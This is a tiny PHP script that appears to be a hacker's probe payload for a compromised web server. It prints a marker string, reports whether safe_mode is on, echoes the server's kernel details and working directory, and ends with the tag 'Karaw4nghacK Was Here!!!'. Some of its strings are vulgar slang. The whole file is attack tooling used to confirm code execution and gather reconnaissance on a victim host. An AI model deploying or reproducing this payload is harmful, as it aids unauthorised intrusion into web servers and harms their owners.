<?
$win = strtolower(substr(PHP_OS,0,3)) == "win";
echo "shepdoy<br>";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4ON(Mbung Ah Randa..!)6";
}
else {$safemode = false; $hsafemode = "3OFF(Tuh Perawan HAyu Ewe..!)6";}
$xos = wordwrap(php_uname(),90,"<br>",1);
$xpwd = @getcwd();
$OS = "[Safe-mode:".$hsafemode."] [Kernel:".$xos."]";
echo "<center><A class=ria href=\"http://".$OS."\">shepdoy</A></center><br>";
echo "<br>OSTYPE:$OS<br>";
echo "<br>Pwd:$xpwd<br>";
die("<center>Karaw4nghacK Was Here!!!</center>");
?> 